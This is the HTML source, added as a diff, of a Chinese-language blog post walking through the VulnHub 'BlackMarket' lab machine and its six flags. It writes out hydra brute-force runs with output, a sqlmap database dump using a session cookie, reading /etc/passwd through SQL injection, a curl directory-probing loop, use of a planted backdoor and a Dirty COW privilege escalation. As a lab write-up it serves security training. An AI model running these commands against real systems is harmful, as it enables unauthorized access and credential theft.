@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="介绍https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;blackmarket-1,223&#x2F; 然后靶机描述说有6个flag,每个flag都有hint… 个人感觉脑洞有点大…看的wp做的.. ip端口ip:192.168.1.106 端口  flag1去80端口 源码拿到flag1 1flag1&amp;#123;Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU&#x3D;&amp;#125;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透(blackmarket)">
+<meta property="og:url" content="http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="介绍https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;blackmarket-1,223&#x2F; 然后靶机描述说有6个flag,每个flag都有hint… 个人感觉脑洞有点大…看的wp做的.. ip端口ip:192.168.1.106 端口  flag1去80端口 源码拿到flag1 1flag1&amp;#123;Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU&#x3D;&amp;#125;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-15-46-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-16-48-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-16-51-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-19-10-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/0.7d9nzmb276f.png">
+<meta property="og:image" content="http://example.com/images/2018/10/0.dlp3yrthkfj.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-19-19-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-19-22-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-19-37-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-19-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-20-01-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-20-23-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-20-24-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-20-26-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-20-27-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-20-29-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-20-32-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-06-21-17-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="article:published_time" content="2018-10-06T13:22:15.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.463Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2018/10/2018-10-06-15-46-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>靶机渗透(blackmarket)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/10/07/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fpinkys-palace/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/10/04/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftrollcave/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&text=靶机渗透(blackmarket)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&is_video=false&description=靶机渗透(blackmarket)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机渗透(blackmarket)&body=Check out this article: http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&name=靶机渗透(blackmarket)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&t=靶机渗透(blackmarket)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.</span> <span class="toc-text">ip端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">3.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">5.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">6.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag5"><span class="toc-number">7.</span> <span class="toc-text">flag5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag6"><span class="toc-number">8.</span> <span class="toc-text">flag6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text">提权</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶机渗透(blackmarket)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-10-06T13:22:15.000Z" class="dt-published" itemprop="datePublished">2018-10-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pentest/">pentest</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/blackmarket-1,223/" title="https://www.vulnhub.com/entry/blackmarket-1,223/">https://www.vulnhub.com/entry/blackmarket-1,223/</a> 然后靶机描述说有6个flag,每个flag都有hint… 个人感觉脑洞有点大…看的wp做的..</p>
+<h2 id="ip端口"><a href="#ip端口" class="headerlink" title="ip端口"></a>ip端口</h2><p>ip:192.168.1.106 端口 <a href="/images/2018/10/2018-10-06-15-46-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-15-46-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a></p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>去80端口 源码拿到flag1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1&#123;Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=&#125;</span><br></pre></td></tr></table></figure>
+
+<p>base解一下得到<code>CIA - Operation Treadstone</code> 搜了一下,发现是个电影….猜测要去找用户名爆破…懒得找了直接看wp了…. wp用的crew获取密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w cewl.txt http://bourne.wikia.com/wiki/Operation_Treadstone</span><br></pre></td></tr></table></figure>
+
+<p>然后hydra爆破,不过爆破的是ftp,后面再说</p>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>回到80端口dirb一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.1.106/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/admin/                                                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/css/                                                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/db/                                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/dist/                                                                                            </span><br><span class="line">+ http://192.168.1.106/index.php (CODE:200SIZE:2433)                                                                                </span><br><span class="line">+ http://192.168.1.106/server-status (CODE:403SIZE:293)                                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/squirrelmail/                                                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/supplier/                                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/upload/                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/user/                                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/vendor/ </span><br></pre></td></tr></table></figure>
+
+<p>登录页面hydra爆破一下,wp直接username就放三个用户名:user,supplier,admin….反正我不知道为什么想到这个…</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:~$ hydra -L username.txt -P /home/blacsheep/Tools/WebSecurity/dict/passwords/common/Top196-probable.txt -e nsr -t 64 192.168.1.106 http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:failed&quot;</span></span><br><span class="line">Hydra v8.6 (c) 2017 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-06 16:44:39</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 597 login tries (l:3/p:199), ~10 tries per task</span><br><span class="line">[DATA] attacking http-post-form://192.168.1.106:80//login.php:username=^USER^&amp;password=^PASS^:failed</span><br><span class="line">[80][http-post-form] host: 192.168.1.106   login: supplier   password: supplier</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-06 16:44:51</span><br></pre></td></tr></table></figure>
+
+<p>拿到密码:supplier&#x2F;supplier 登录上去 <a href="/images/2018/10/2018-10-06-16-48-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-16-48-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 随手一测一个注入… <a href="/images/2018/10/2018-10-06-16-51-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-16-51-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> sqlmap跑一下,真的跑的很慢…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.106/supplier/edit_product.php?id=16&quot; --cookie=&quot;PHPSESSID=ddqpnve2g6ptetfu39b5kdoj24&quot; -o -D BlackMarket -T flag --dump</span><br></pre></td></tr></table></figure>
+
+<p><a href="/images/2018/10/2018-10-06-19-10-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-19-10-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 脱库太慢了,直接用别人的图了 <a href="/images/2018/10/0.7d9nzmb276f.png"><img src="/images/2018/10/0.7d9nzmb276f.png"></a> <a href="/images/2018/10/0.dlp3yrthkfj.png"><img src="/images/2018/10/0.dlp3yrthkfj.png"></a></p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>发现注入可以读取文件,读&#x2F;etc&#x2F;passwd发现ftp用户nicky</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">dimitri:x:1000:1000:,,,:/home/dimitri:/bin/bash</span><br><span class="line">jbourne:x:1001:1001::/var/www/html/jbourne:</span><br><span class="line">nicky:x:1002:1002:,,,:/home/nicky:/bin/ftponly</span><br><span class="line">ftp:x:112:120:ftp daemon,,,:/srv/ftp:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>hydra爆一下 <a href="/images/2018/10/2018-10-06-19-19-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-19-19-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 登录进去发现文件下下来 <a href="/images/2018/10/2018-10-06-19-22-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-19-22-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a></p>
+<blockquote>
+<p>flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy} If anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!</p>
+</blockquote>
+<p>flag2的hint:Congrats Proceed Further</p>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>admin界面有用户管理,修改密码处存在漏洞,可以指定用户修改,改掉id&#x3D;1的用户 <a href="/images/2018/10/2018-10-06-19-37-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-19-37-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 登录直接拿到flag <a href="/images/2018/10/2018-10-06-19-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-19-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 解一下,nothing is here</p>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>根据上条hint,登录一下邮箱(jbourne:?????) <a href="/images/2018/10/2018-10-06-20-01-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-20-01-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 拿到信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Flag5&#123;RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=&#125;</span><br><span class="line"></span><br><span class="line">HELLO Friend,</span><br><span class="line"></span><br><span class="line">I have intercept the message from Russian&#x27;s some how we are working on the same</span><br><span class="line">direction, however, I couldn&#x27;t able to decode the message. </span><br><span class="line"></span><br><span class="line">&lt;Message Begins&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sr Wrnrgir</span><br><span class="line">Ru blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli rm Yozxpnzipvg</span><br><span class="line">dliphslk fmwvi /ptyyzxpwlli ulowvi blf nfhg szev gl fhv</span><br><span class="line">KzhhKzhh.qkt rm liwvi gl tvg zxxvhh.</span><br><span class="line"></span><br><span class="line">&lt;/end&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://quipqiup.com/" title="https://quipqiup.com/">https://quipqiup.com/</a>解密拿到信息Everything is encrypted 试了一下凯撒,发现并不是,试了一个替换密码多给几个线索拿到明文</p>
+<blockquote>
+<p>Hi Dimitri If you are reading this I might be not alive. I have place a backdoor in Blackmarket workshop under &#x2F;kgbbackdoor folder you must have to use PassPass.jpg in order to get access</p>
+</blockquote>
+<h2 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h2><p>这一步又很脑洞了… 访问workshop发现404 试了一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> &#123;a..z&#125;; <span class="keyword">do</span> <span class="built_in">printf</span> <span class="string">&quot;/<span class="variable">$&#123;c&#125;</span>workshop/:%d\n&quot;</span> $(curl -s -w %&#123;http_code&#125; -o /dev/null 192.168.1.106/<span class="variable">$&#123;c&#125;</span>workshop/); <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="/images/2018/10/2018-10-06-20-23-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-20-23-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 发现vworkshop为200,按前面的目录进去看下 <a href="/images/2018/10/2018-10-06-20-24-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-20-24-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> strings一下拿到密码 <a href="/images/2018/10/2018-10-06-20-26-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-20-26-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 解一下,拿到真实密码<code>HailKGB</code> <a href="/images/2018/10/2018-10-06-20-27-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-20-27-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 访问backdoor.php,发现404,但是页面不一样 <a href="/images/2018/10/2018-10-06-20-29-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-20-29-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 发现其实有密码,post一下发现确实是后门 <a href="/images/2018/10/2018-10-06-20-32-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-20-32-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a> 拿到flag6 flag6{Um9vdCB0aW1l} 解一下:Root time</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>直接上脏牛 root密码变成了dirtyCowFun 登录上去拿到最后的flag <a href="/images/2018/10/2018-10-06-21-17-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-06-21-17-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.</span> <span class="toc-text">ip端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">3.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">5.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">6.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag5"><span class="toc-number">7.</span> <span class="toc-text">flag5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag6"><span class="toc-number">8.</span> <span class="toc-text">flag6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text">提权</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&text=靶机渗透(blackmarket)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&title=靶机渗透(blackmarket)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/&is_video=false&description=靶机渗透(blackmarket)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机渗透(blackmarket)&body=Check out this article: http://example.com/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
